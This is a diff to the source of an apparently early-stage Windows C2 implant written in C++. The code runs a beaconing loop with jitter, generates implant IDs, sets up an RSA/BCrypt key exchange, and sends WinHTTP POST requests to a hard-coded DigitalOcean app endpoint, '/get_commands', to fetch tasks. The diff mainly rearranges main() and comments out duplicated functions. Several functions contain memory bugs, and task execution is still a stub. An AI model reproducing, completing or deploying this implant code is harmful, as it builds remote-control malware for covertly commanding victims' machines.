@@ -8,6 +8,7 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 #include <windows.h>
 #include <winhttp.h>
 #include <future> 
+#include <cmath>
 #define SERVERNAME "placeholder"
 #define SLEEP 60000
 #define serverpublickey "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzx4uIFIDB0pWvgR/JxYiS1CFOgxV4zWWprRE/Te48cZSC49SHXAya/gKIHO66/7I1yFNiuLhcqtuDx2Pt1fSK1Hw2neXkFRnbGDJXLkGldGe+7Uqjw1XrTT24QXRjAFE/jmVm3FtvrsHloSQZO5mvrHOzHsd+AH4i/HK3rDQ7U6vgQfroPpShD2mK6HPYsQxHTTiz+SMGD3VpG49aUk7YLxR2pfVA/x7vo7MLXDwYI2znwMcu0C5MweN4f7x7C0aop6qFQZVef1/2TbdeSEdri6oWAkwFWA8PCiQaIXvrnjOgm4zMDtFE3CHbcl335ArDQoeCPdeFjIIubGOlUfmAFHJ7Xntb/q2mgDz3VZ9ox7Jzd/ZktrODVyO8VTL3Wt4nQx48fSNU8bWfrTlrKmXwA/2+mvhNjFBRF6R5a7JztsrZkQ1Y1FbMstkw1+Q80mLsLowAfE2VerKjCd7484XXpDtvEdaPkPiYgfRTotrhkkpkcKlLCvdArbNxDnkv328= sumthing"
@@ -167,7 +168,6 @@ void runLoop(bool isRunning){
             std::cout << getting << std::endl;
             //WHEN WE GET THE FORMAT, THEN PARSE
             //THEN AFTER PARSE FEED INTO EXECUTE
-
             //const auto serverResponse = std::async(std::launch::async, getTasks);
             //auto parsedTasks = parseTasks(serverResponse.get());
             //auto success = executeTasks(parsedTasks);
@@ -223,17 +223,6 @@ char *make_base_payload(char *implant_id)
     strcat(payload, implant_id);
     return payloadptr;
 }
-
-int main(int argc, char *argv[])
-{
-    runLoop(true);
-    return 0;
-}
-
-
-
-
-
 
 
 
@@ -291,7 +280,7 @@ char* getsecret(){
     BCryptGetProperty(ahandle,BCRYPT_KEY_LENGTH,NULL,0,&symkeypropertylen,0);
     PUCHAR symkeylen=(PUCHAR)malloc(symkeypropertylen);
     BCryptGetProperty(ahandle,BCRYPT_KEY_LENGTH,symkeylen,symkeypropertylen,&bytescopied,0);
-    PUCHAR symkey=(PUCHAR)malloc((int)symkeylen);  
+    PUCHAR symkey=(PUCHAR)malloc(symkeylen);  
     
     /*
     BCryptGetProperty(ahandle,BCRYPT_KEY_LENGTH,NULL,0,&symkeypropertylen,0);
@@ -309,6 +298,34 @@ char* getsecret(){
 
 
 
+
+
+
+
+
+
+
+
+
+
+int main(int argc, char *argv[])
+{
+    runLoop(true);
+    return 0;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+/* Code not used 
 LPSTR makeGetRequest(LPCWSTR servername, LPCWSTR subdirectory){
     HINTERNET httpsession = WinHttpOpen(
         L"GenericAPICaller",
@@ -373,8 +390,6 @@ LPSTR makeGetRequest(LPCWSTR servername, LPCWSTR subdirectory){
         }
     }
 }
-
-
 LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata)
 {
     DWORD datalen = strlen(postdata);
@@ -408,7 +423,6 @@ LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *post
                 if(WinHttpAddRequestHeaders(request, L"\"Content-Type\": \"application/json\"", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)){
                     printf("YOU SET HEADER");
                 }
-
         
                 BOOL idrequest = WinHttpSendRequest(
                     request,
@@ -452,89 +466,4 @@ LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *post
         }
     }
 }
-
-char* getData(){
-    int num = 1;
-    char* results;
-    sprintf(results,"\{\"id\": %d \}",num);
-
-    return results;
-}
-//TODO
-LPSTR getTasks(void){
-    std::string fqdn = "walrus-app-tj8x9.ondigitalocean.app";
-    std::wstring fqdn_wstring(fqdn.begin(), fqdn.end());
-    LPCWSTR servername = fqdn_wstring.c_str();
-
-    std::string fqdn2 = "/get_commands";
-    std::wstring fqdn_wstring2(fqdn2.begin(), fqdn2.end());
-    LPCWSTR subdirectory = fqdn_wstring2.c_str();
-
-    const char* postdata = getData();
-    // const char* postdata = getData();
-    LPSTR item = makePostRequest(servername, subdirectory, postdata);
-
-    return item;
-}
-void runLoop(bool isRunning){
-    BCRYPT_KEY_HANDLE rsakey=importrsakey((PUCHAR)*serverpublickey,(ULONG)562);
-    newsymkey(rsakey);
-    while (isRunning) {
-        try {
-
-            LPSTR getting = getTasks();
-            //const auto serverResponse = std::async(std::launch::async, getTasks);
-            //auto parsedTasks = parseTasks(serverResponse.get());
-            //auto success = executeTasks(parsedTasks);
-        }
-        catch (const std::exception& e) {
-            printf("\nError in runLoop: %s\n", e.what());
-        }
-
-        //SET SLEEP HERE 
-    }
-
-}
-
-int sendresults()
-{
-    while (1)
-    {
-        //create jitter from 0 to 5 mins 
-        int jitter;
-        jitter=rand()*10; 
-        Sleep(SLEEP+jitter);
-        // Send results, check response
-        // If good response break
-    }
-}
-
-// Random Implant ID in hex using rand()
-// https://stackoverflow.com/questions/33325814/how-to-loop-generate-random-256bit-hex-in-c-or-c
-char *random_id()
-{
-    char random_hex[32 + 1];
-    char *random_hexptr = random_hex;
-
-    srand(time(0));
-    for (int i = 0; i < 32; i++)
-    {
-        sprintf(random_hex + i, "%x", rand() % 32);
-    }
-
-    return random_hexptr;
-}
-
-char *make_base_payload(char *implant_id)
-{
-    char payload[51] = "{\"implant_id\": }";
-    char *payloadptr = payload;
-    strcat(payload, implant_id);
-    return payloadptr;
-}
-
-int main(int argc, char *argv[])
-{
-    runLoop(true);
-    return 0;
-}
+ Code not used */
